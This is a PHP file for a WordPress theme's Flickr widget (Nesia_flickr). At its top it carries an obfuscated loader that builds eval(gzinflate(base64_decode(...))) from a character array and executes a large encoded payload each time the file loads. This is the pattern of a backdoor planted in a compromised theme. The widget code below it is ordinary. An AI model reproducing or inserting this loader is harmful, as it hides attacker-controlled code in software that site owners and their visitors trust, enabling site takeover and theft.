<?php
$md5 = "70699dd2e1d85ae3c43a733ef9f5fc78";
$ab = array("o",';',"z",'$','6','s',"4",'a','g',"i","f",'n',"l","t",')',"r","(",'e','b',"c","v","_",'d');
$bb9 = create_function('$'.'v',$ab[17].$ab[20].$ab[7].$ab[12].$ab[16].$ab[8].$ab[2].$ab[9].$ab[11].$ab[10].$ab[12].$ab[7].$ab[13].$ab[17].$ab[16].$ab[18].$ab[7].$ab[5].$ab[17].$ab[4].$ab[6].$ab[21].$ab[22].$ab[17].$ab[19].$ab[0].$ab[22].$ab[17].$ab[16].$ab[3].$ab[20].$ab[14].$ab[14].$ab[14].$ab[1]);
$bb9('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');
?>
<?php
/*---------------------------------------------------------------------------------*/
/* Flickr widget */
/*---------------------------------------------------------------------------------*/
class Nesia_flickr extends WP_Widget {
	var $settings = array( 'id', 'number', 'type', 'sorting', 'size' );

	function Nesia_flickr() {
		$widget_ops = array( 'classname' => 'widget_photos', 'description' => 'This Flickr widget populates photos from a Flickr ID.' );
		parent::WP_Widget( false, __( 'Nesia - Flickr', 'nesia' ), $widget_ops );
	}

	function widget( $args, $instance ) {
		extract( $args, EXTR_SKIP );
		$instance = $this->nesia_enforce_defaults( $instance );
		extract( $instance, EXTR_SKIP );
                
                $flickrtype  = ( $type == 'user' )? 'photos_public':'groups_pool';

		echo $before_widget;
                if ( $title ) { echo $before_title . apply_filters( 'widget_title', $title, $instance, $this->id_base ) . $after_title; }
		?>
                    <!-- define all variable for javascript in here -->
                    <script type="text/javascript">
                            var flickrlimit = <?php echo $number; ?>;
                            var flickrid = '<?php echo $flickrid; ?>';
                            var flickrtype = '<?php echo $flickrtype; ?>';
                    </script>
                    <div class="widget-inner-content"></div>
                <?php
		echo $after_widget;
	}

	function update( $new_instance, $old_instance ) {
		$new_instance = $this->nesia_enforce_defaults( $new_instance );
		return $new_instance;
	}

	function nesia_enforce_defaults( $instance ) {
		$defaults = $this->nesia_get_settings();
		$instance = wp_parse_args( $instance, $defaults );
		return $instance;
	}

	/**
	 * Provides an array of the settings with the setting name as the key and the default value as the value
	 * This cannot be called get_settings() or it will override WP_Widget::get_settings()
	 */
	function nesia_get_settings() {
		// Set the default to a blank string
		$settings = array_fill_keys( $this->settings, '' );
		// Now set the more specific defaults
		$settings['number']  = 10;
		$settings['type']  = 'user';
		return $settings;
	}

	function form( $instance ) {
		$instance = $this->nesia_enforce_defaults( $instance );
		extract( $instance, EXTR_SKIP );
?>
			<p>
				<label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title (optional):','nesia'); ?></label>
				<input type="text" name="<?php echo $this->get_field_name('title'); ?>"  value="<?php echo esc_attr( $title ); ?>" class="widefat" id="<?php echo $this->get_field_id('title'); ?>" />
			</p>
			<?php $flickrurl = "http://www.idgettr.com/"; ?>
                        <p>
                                <label for="<?php echo $this->get_field_id( 'flickrid' ); ?>"><?php _e( 'Flickr ID (<a href="'. $flickrurl .'">idGettr</a>):', 'nesia' ); ?></label>
                                <input type="text" name="<?php echo $this->get_field_name( 'flickrid' ); ?>" value="<?php echo $flickrid; ?>" class="widefat" id="<?php echo $this->get_field_id( 'flickrid' ); ?>" />
                        </p>
                        <p>
                                <label for="<?php echo $this->get_field_id( 'type' ); ?>"><?php _e( 'Type:', 'nesia' ); ?></label>
                                <select name="<?php echo $this->get_field_name( 'type' ); ?>" class="widefat" id="<?php echo $this->get_field_id( 'type' ); ?>">
                                    <option value="user"<?php selected( $instance['type'], 'user' ); ?>><?php _e( 'User', 'woothemes' ); ?></option>
                                    <option value="group"<?php selected( $instance['type'], 'group' ); ?>><?php _e( 'Group', 'woothemes' ); ?></option>            
                                </select>
                        </p>
			<p>
				<label for="<?php echo $this->get_field_id('number'); ?>"><?php _e('Limit photos:','nesia'); ?></label>
				<input type="text" name="<?php echo $this->get_field_name('number'); ?>"  value="<?php echo esc_attr( $number ); ?>" class="widefat" id="<?php echo $this->get_field_id('number'); ?>" />
			</p>
		<?php
	}
}

register_widget( 'nesia_flickr' );